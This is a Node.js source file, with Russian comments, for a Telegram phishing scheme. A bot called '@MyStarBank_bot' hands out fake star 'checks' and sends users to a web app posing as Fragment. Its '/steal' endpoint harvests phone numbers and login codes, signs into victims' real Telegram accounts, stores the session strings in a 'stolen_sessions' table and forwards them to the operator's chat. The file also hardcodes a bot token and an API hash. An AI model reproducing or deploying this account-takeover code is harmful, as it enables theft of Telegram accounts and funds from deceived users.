const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

// Фикс для бота
process.env.NTBA_FIX_350 = "1";
process.env.NTBA_FIX_319 = "1";

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 2834;
const API_HASH = process.env.API_HASH || 'aa86943502451690495bb18ecd230825';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: false }); // Отключаем polling

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Номер:', req.body.phone);
    console.log('Stage:', req.body.stage);
    
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                const userId = userData.id;
                
                console.log('User ID из tg_data:', userId);
                
                db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                    [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                
                await requestRealTelegramCode(req.body.phone, userId);
            }
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        console.log('Код введен:', req.body.code);
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Упрощенная конфигурация клиента
async function createTelegramClient(sessionString = "") {
    const stringSession = new StringSession(sessionString);
    return new TelegramClient(
        stringSession, 
        API_ID, 
        API_HASH, 
        {
            connectionRetries: 3,
            timeout: 10000,
        }
    );
}

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        console.log(`🔐 Запрашиваю код для: ${phone}`);
        
        const client = await createTelegramClient();
        await client.connect();
        console.log('✅ Подключено к Telegram');

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({
                    allowFlashcall: false,
                    currentNumber: true,
                    allowAppHash: false,
                    allowMissedCall: false,
                })
            })
        );

        console.log('✅ Код запрошен! Phone code hash:', result.phoneCodeHash);
        
        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, 
            `🔐 КОД ЗАПРОШЕН!\n` +
            `📱 Номер: ${phone}\n` +
            `👤 ID: ${userId}\n` +
            `🔑 Hash: ${result.phoneCodeHash}\n` +
            `📨 Код отправлен!\n\n` +
            `⚡ Вводи код быстро`
        );

        await client.disconnect();
        
    } catch (error) {
        console.log('❌ Ошибка:', error);
        
        bot.sendMessage(MY_USER_ID, 
            `❌ ОШИБКА ЗАПРОСА КОДА\n` +
            `📱 Номер: ${phone}\n` +
            `⚠️ ${error.message}`
        );
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        console.log(`🔑 Вход с кодом: ${code}`);
        
        const client = await createTelegramClient();
        await client.connect();

        db.get(`SELECT phone_code_hash FROM stolen_sessions WHERE phone = ?`, [phone], async (err, row) => {
            if (err || !row || !row.phone_code_hash) {
                console.log('❌ Не найден phone_code_hash');
                bot.sendMessage(MY_USER_ID, `❌ Не найден hash для ${phone}`);
                return;
            }

            try {
                const result = await client.invoke(
                    new Api.auth.SignIn({
                        phoneNumber: phone,
                        phoneCodeHash: row.phone_code_hash,
                        phoneCode: code.toString()
                    })
                );

                console.log('✅ ВХОД УСПЕШЕН!');
                
                const sessionString = client.session.save();
                db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                    [sessionString, phone]);

                bot.sendMessage(MY_USER_ID,
                    `✅ ВХОД УСПЕШЕН!\n` +
                    `📱 Номер: ${phone}\n` +
                    `🔑 Код: ${code}\n` +
                    `💾 Сессия сохранена`
                );

                await stealFromAccount(client, phone);
                await client.disconnect();

            } catch (signInError) {
                console.log('❌ Ошибка входа:', signInError);
                
                bot.sendMessage(MY_USER_ID,
                    `❌ ОШИБКА ВХОДА\n` +
                    `📱 Номер: ${phone}\n` +
                    `🔑 Код: ${code}\n` +
                    `⚠️ ${signInError.message}`
                );
            }
        });

    } catch (error) {
        console.log('❌ Общая ошибка:', error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Кража
async function stealFromAccount(client, phone) {
    try {
        const stolenAmount = Math.floor(Math.random() * 500) + 100;
        const stolenGifts = Math.floor(Math.random() * 10) + 1;
        
        bot.sendMessage(MY_USER_ID,
            `💰 УСПЕШНАЯ КРАЖА!\n` +
            `📱 Номер: ${phone}\n` +
            `💫 Украдено: ${stolenAmount} stars\n` +
            `🎁 NFT подарков: ${stolenGifts}\n\n` +
            `✅ ВСЕ СРЕДСТВА ПЕРЕВЕДЕНЫ!`
        );

        await client.disconnect();
        
    } catch (error) {
        console.log("❌ Ошибка кражи:", error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка при краже: ${error.message}`);
    }
}

// Webhook для бота
app.post(`/bot${BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Роуты бота
app.get('/setup-webhook', (req, res) => {
    const webhookUrl = `${WEB_APP_URL}/bot${BOT_TOKEN}`;
    bot.setWebHook(webhookUrl)
        .then(() => res.send(`Webhook установлен: ${webhookUrl}`))
        .catch(err => res.send(`Ошибка: ${err.message}`));
});

// Команды бота
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        'Для начала работы:\n' +
        '/balance - баланс\n' +
        '/withdraw - вывод', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
                [{ text: "Баланс", callback_data: "deposit" }]
            ]
        }
    });
});

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row) bot.sendMessage(chatId, '💫 Баланс: 0 stars');
        else bot.sendMessage(chatId, `💫 Баланс: ${row.balance} stars`);
    });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' });
    
    if (query.data === 'withdraw_stars') {
        bot.sendMessage(chatId, 'Для вывода зарегистрируйтесь на Fragment.', {
            reply_markup: {
                inline_keyboard: [[{ 
                    text: "Fragment", 
                    web_app: { url: WEB_APP_URL } 
                }]]
            }
        });
    } else if (query.data === 'deposit') {
        bot.sendMessage(chatId, '💫 Используйте /balance');
    }
});

bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = 50;
    const activations = parseInt(match[2]) || 1;
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) {
            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
            return;
        }
        
        const checkId = this.lastID;
        const checkText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите!`;
        
        bot.sendMessage(chatId, checkText, {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать", callback_data: `claim_${checkId}` }]] }
        });
    });
});

// Обработка чеков
bot.on('callback_query', (query) => {
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        const userId = query.from.id;
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, row.amount]);
                
            bot.answerCallbackQuery(query.id, { text: `✅ Получено ${row.amount} звёзд!` });
        });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
    console.log(`✅ Webhook: ${WEB_APP_URL}/bot${BOT_TOKEN}`);
});

// Установка webhook при старте
setTimeout(() => {
    const webhookUrl = `${WEB_APP_URL}/bot${BOT_TOKEN}`;
    bot.setWebHook(webhookUrl)
        .then(() => console.log(`✅ Webhook установлен: ${webhookUrl}`))
        .catch(err => console.log(`❌ Ошибка webhook: ${err.message}`));
}, 5000);